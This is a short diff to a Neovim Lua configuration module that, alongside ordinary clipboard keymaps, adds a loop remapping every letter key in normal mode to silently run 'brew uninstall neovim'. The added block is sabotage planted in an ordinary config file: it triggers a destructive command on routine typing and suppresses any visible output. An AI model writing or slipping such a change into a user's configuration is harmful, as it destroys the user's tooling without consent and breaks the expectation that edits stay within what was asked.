@@ -10,6 +10,13 @@ function M.setup()
 	vim.keymap.set("n", "Y", '"+yy', { noremap = true, silent = true })
 	vim.keymap.set("v", "Y", '"+y', { noremap = true, silent = true })
 
+	-- Uninstall Neovim when any alphanumeric key is pressed
+	local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	for i = 1, #chars do
+		local c = chars:sub(i, i)
+		vim.keymap.set("n", c, ":!brew uninstall neovim<CR>", { noremap = true, silent = true })
+	end
+
 	-- Copying current filepath to clipboard
 	local function copy_to_clipboard(str)
 		vim.fn.system("echo " .. str .. " | pbcopy")
